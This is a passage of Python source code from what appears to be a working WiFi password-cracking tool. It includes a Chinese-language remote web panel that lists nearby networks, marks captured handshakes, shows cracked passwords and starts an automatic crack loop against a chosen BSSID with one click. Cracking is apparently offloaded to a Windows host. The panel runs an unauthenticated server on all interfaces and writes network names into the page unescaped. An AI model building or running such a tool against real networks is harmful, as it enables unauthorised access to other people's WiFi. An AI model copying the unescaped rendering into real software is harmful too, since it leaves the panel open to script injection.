                self._log('   ⚠️ 連不到 Windows')
                self._result('Windows 離線', C_RED)
            time.sleep(4)
        self._log('   ⚠️ 等待逾時 (%ds)' % timeout)
        return None

    def _web_status(self):
        full, reach, hits = self._coverage()
        fh = full & hits
        ckd = self._known()[0]
        ok = time.time() - getattr(self, '_api_ok_ts', 0) < 130
        ev = []
        try:
            with open('/tmp/mac_wifi_events.log') as f:
                ev = f.read().splitlines()[-20:]
        except OSError:
            pass
        bid = {k for k, v in self.reach_seen.items()
               if time.time() - v < 3600}
        aps = []
        for (ssid, bssid, ch, sig) in self.aps:
            aps.append({'ssid': ssid, 'bssid': bssid, 'ch': ch,
                        'sig': sig, 'hash': bssid.lower()[-6:] in hits,
                        'bidir': bssid.lower() in bid,
                        'pw': ckd.get(ssid) or ''})
        if not aps:
            for bb, v in self.aps_seen.items():
                ssid = v[0] or '(hidden)'
                aps.append({'ssid': ssid + ' *', 'bssid': bb, 'ch': v[1],
                            'sig': v[2],
                            'hash': bb.lower()[-6:] in hits,
                            'bidir': bb.lower() in bid,
                            'pw': ckd.get(ssid) or ''})
            def _sg(a):
                try:
                    return int(a['sig'])
                except (ValueError, TypeError):
                    return -999
            aps.sort(key=_sg, reverse=True)
        q = self._load_queue()
        return {'cov': {'pct': round(100.0 * len(fh) / len(full), 1)
                        if full else 0, 'hit': len(fh), 'total': len(full)},
                'win': {'online': ok, 'ep': getattr(self, '_good_ep', '')},
                'queue': len(q),
                'queue_list': [{'ssid': v.get('ssid', ''), 'bssid': k}
                               for k, v in q.items()],
                'cfg': {'wip': self.var['wip'].get(),
                        'port': self.var['port'].get(),
                        'dur': self.var['dur'].get()},
                'sweep': bool(getattr(self, '_sweep_on', False)),
                'result': getattr(self, '_last_result', ''),
                'target': list(self.target) if self.target else None,
                'phase': list(self.phase), 'aps': aps, 'events': ev}

    def _web_html(self):
        cfg = self._web_status()['cfg']
        head = ('<!DOCTYPE html><html><head><meta charset="utf-8">'
                '<title>WiFi 破解台 · 遠端控制台</title>'
                '<meta name="viewport" content="width=device-width,'
                'initial-scale=1">'
                '<style>'
                'body{background:#0d1117;color:#c9d1d9;'
                'font-family:-apple-system;padding:18px}'
                'table{border-collapse:collapse;width:100%}'
                '.tw{overflow-x:auto;margin-top:8px}'
                '@media(max-width:640px){td,th{padding:3px 5px;'
                'font-size:11px;white-space:nowrap}'
                'body{padding:10px}}'
                'td,th{padding:4px 8px;border-bottom:1px solid #21262d;'
                'font-size:13px;text-align:left}'
                '.card{display:inline-block;background:#161b22;'
                'border-radius:10px;padding:10px 16px;margin:4px 8px 4px 0}'
                'h1{font-size:20px}pre{font-size:11px;color:#8b949e}'
                'button{background:#238636;color:#fff;border:0;'
                'border-radius:6px;padding:5px 12px;font-size:12px;'
                'cursor:pointer;margin:2px}'
                'button.stop{background:#da3633}'
                'button.cancel{background:#9e6a03}'
                'input{background:#0d1117;color:#c9d1d9;'
                'border:1px solid #30363d;border-radius:6px;'
                'padding:4px;font-size:12px}'
                '</style></head><body>')
        body = ('<h1>📡 WiFi 破解台 · 遠端控制台</h1>'
                '<div class="card">🎯 列表覆蓋 <b id="cov">…</b></div>'
                '<div class="card">☁ Windows <span id="win">…</span></div>'
                '<div class="card">📤 補傳佇列 <span id="q">…</span></div>'
                '<div class="card"><span id="tgtst">…</span></div><br>'
                '<div id="pw" style="font-size:26px;color:#7ee787;'
                'margin:10px 0"></div>'
                '<button class="stop" onclick="stopAll()">■ 全部停止</button>'
                ' <button class="cancel" onclick="cancelT()">✖ 取消目標</button>'
                ' Windows IP <input id="cwip" size="13" value="' +
                cfg['wip'] + '"> Port <input id="cport" size="5" value="' +
                cfg['port'] + '"> 抓包秒 <input id="cdur" size="3" value="' +
                cfg['dur'] + '"> <button onclick="saveCfg()">儲存設定</button>'
                '<div class="tw"><table id="tb"></table></div>'
                '<h3>最近事件</h3><pre id="ev"></pre>')
        js = ('<script>'
              'const HDR="<tr><th>SSID</th><th>BSSID</th><th>頻道</th>'
              '<th>訊號</th><th>方向</th><th>狀態</th><th>動作</th></tr>";'
              'async function api(p,b){const r=await fetch(p,{method:b?"POST":'
              '"GET",headers:{"Content-Type":"application/json"},'
              'body:b?JSON.stringify(b):null});return r.json()}'
              'function tgt(b){api("/api/target",{bssid:b}).then(tick)}'
              'function stopAll(){api("/api/stop",{}).then(tick)}'
              'function cancelT(){api("/api/cancel",{}).then(tick)}'
              'function saveCfg(){api("/api/config",{wip:cwip.value,'
              'port:cport.value,dur:cdur.value}).then(tick)}'
              'async function tick(){try{const s=await api("/api/status");'
              'cov.textContent=s.cov.pct+"%（"+s.cov.hit+"/"+s.cov.total+"）";'
              'win.textContent=s.win.online?("✅ "+s.win.ep):"❌ 離線";'
              'win.style.color=s.win.online?"#7ee787":"#f85149";'
              'q.textContent=s.queue+(s.queue_list.length?"（"+'
              's.queue_list.slice(0,8).map(x=>x.ssid).join(", ")+'
              '(s.queue_list.length>8?" …":"")+"）":"");'
              'tgtst.textContent=(s.target?"目標 "+s.target.join(" · "):'
              '"未選定")+" · "+s.phase[1]+(s.sweep?" · 巡掃中":"");'
              'pw.textContent=s.result||"";'
              's.aps.sort(function(a,b){return (b.bidir?1:0)-(a.bidir?1:0)});'
              'tb.innerHTML=HDR+s.aps.map(a=>{const m=a.pw?("🔑 "+a.pw):'
              '(a.hash?"✅ hash":"—");'
              'const c=a.pw?"#7ee787":(a.hash?"#e3b341":"#8b949e");'
              'const d=a.ch>14?"👂 5G被動":(a.bidir?"✅ 雙向":"⚠️ 單向");'
              'const dc=a.ch>14?"#a371f7":(a.bidir?"#7ee787":"#f0883e");'
              'return "<tr><td>"+a.ssid+"</td><td>"+a.bssid+"</td><td>"+'
              'a.ch+"</td><td>"+a.sig+"</td><td style=\\\"color:"+dc+"\\\">"+d+'
              '"</td><td style=\\\"color:"+c+"\\\">"+m+'
              '"</td><td><button data-b=\\\""+a.bssid+"\\\">🎯 破解</button>'
              '</td></tr>"}).join("");'
              'ev.textContent=s.events.join("\\n")}catch(e){}}'
              'tb.addEventListener("click",e=>{const b=e.target.dataset.b;'
              'if(b)tgt(b)});'
              'setInterval(tick,5000);tick();'
              '</script>')
        return head + body + js + '</body></html>'

    def web_target(self, bssid):
        cands = [(s, b, c, g) for (s, b, c, g) in self.aps]
        for bb, v in self.aps_seen.items():
            if all(c[1].lower() != bb.lower() for c in cands):
                cands.append((v[0] or '(hidden)', bb, v[1], v[2]))
        for (ssid, b, ch, sig) in cands:
            if b.lower() == bssid.lower():
                self.target = (ssid, b, ch)
                self._tgt_miss = 0
                self._tgt_cancel.clear()
                self._ui(lambda ss=ssid: self.lbl_target.config(
                    text=ss, fg=C_TEXT))
                self._ui(lambda bb=b, cc=ch, gg=(sig or '?'): (
                    self.lbl_target_sub.config(
                        text='%s · ch%s · %s' % (bb, cc, gg))))
                self._log('🎯 網頁選定: %s (%s ch%s) → 自動開始' % (
                          ssid, b, ch))
                self._ev('web', 'target=%s' % bssid)
                pw = self._known()[0].get(ssid)
                if pw:
                    self.set_phase('done', '🔓 已破解（之前解過）', pw)
                    self._result('🔓  %s' % pw, C_GREEN)
                    return {'ok': True, 'cracked': pw}
                if not self._running.is_set():
                    threading.Thread(target=self._auto_loop,
                                     args=(ssid, b, ch), daemon=True).start()
                    return {'ok': True, 'started': True}
                return {'ok': True, 'running': True}
        return {'ok': False, 'err': 'AP not in scan list'}

    def target_cancel(self):
        if not self.target:
            return {'ok': False, 'err': '目前無目標'}
        t = self.target[0]
        self._tgt_cancel.set()
        self.target = None
        self.set_phase('idle', '目標已取消', '返回巡掃')
        self._result('✖ 已取消 %s — 返回巡掃' % t, C_DIM)
        self._ev('cancel', t)
        return {'ok': True}

    def web_config(self, wip, port, dur):
        if wip:
            self.var['wip'].set(str(wip).strip())
        if port:
            self.var['port'].set(str(port).strip())
        if dur:
            self.var['dur'].set(str(dur).strip())
        self._ev('web', 'config wip=%s port=%s dur=%s' % (wip, port, dur))
        return {'ok': True}
    def _web_loop(self):
        try:
            from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
            app = self

            class H(BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    try:
                        if self.path.startswith('/api/status'):
                            body = json.dumps(app._web_status()).encode()
                            ct = 'application/json'
                        else:
                            body = app._web_html().encode('utf-8')
                            ct = 'text/html; charset=utf-8'
                        self.send_response(200)
                        self.send_header('Content-Type', ct)
                        self.send_header('Content-Length', str(len(body)))
                        self.end_headers()
                        self.wfile.write(body)
                    except Exception:
                        pass

                def do_POST(self):
                    try:
                        ln = int(self.headers.get('Content-Length') or 0)
                        d = json.loads(self.rfile.read(ln) or b'{}')
                        if self.path == '/api/target':
                            r = app.web_target(d.get('bssid', ''))
                        elif self.path == '/api/cancel':
                            r = app.target_cancel()
                        elif self.path == '/api/stop':
                            app.stop_all()
                            r = {'ok': True}
                        elif self.path == '/api/config':
                            r = app.web_config(d.get('wip'), d.get('port'),
                                               d.get('dur'))
                        else:
                            r = {'ok': False, 'err': 'unknown'}
                    except Exception as e:
                        r = {'ok': False, 'err': repr(e)}
                    body = json.dumps(r).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)

            srv = ThreadingHTTPServer(('0.0.0.0', WEB_PORT), H)
            srv.daemon_threads = True
            self._ev('web', 'serving :%d' % WEB_PORT)
            srv.serve_forever()
        except Exception as e:
            self._ev('web', 'fail=%r' % e)

    def close(self):
        self._stop.set()
        try:
            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
        except Exception:
            pass
        self.root.destroy()


def _kill_other_instances():
    try:
        me = os.getpid()
        r = subprocess.run(['ps', '-axo', 'pid=,command='], capture_output=True, timeout=10)
        for ln in (r.stdout or b'').decode('utf-8', 'replace').splitlines():
            if 'mac_wifi_app_v2.py' not in ln:
                continue
            try:
                p = int(ln.strip().split()[0])
            except Exception:
                continue
            if p != me:
                try:
                    os.kill(p, 9)
                except Exception:
                    pass
    except Exception:
        pass

def _acquire_lock():
    import socket
    for _ in range(2):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            s.bind(APP_LOCK)
            s.listen(1)
            return s
        except OSError:
            try:
                t = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                t.settimeout(2)
                t.connect(APP_LOCK)
                t.close()
                return None
            except OSError:
                try:
                    os.unlink(APP_LOCK)
                except Exception:
                    pass
    return None

def main():
    lock = _acquire_lock()
    root = tk.Tk()
    if lock is None:
        root.title('WiFi 破解台')
        root.configure(bg=C_BG)
        tk.Label(root, text='WiFi 破解台 已在執行中\n（直接用螢幕上那個視窗即可）',
                 font=('PingFang TC', 16), bg=C_BG, fg=C_AMBER,
                 padx=40, pady=30).pack()
        root.mainloop()
        return
    app = App(root)
    app._lock = lock
    root.protocol('WM_DELETE_WINDOW', app.close)
    root.mainloop()

if __name__ == '__main__':
    main()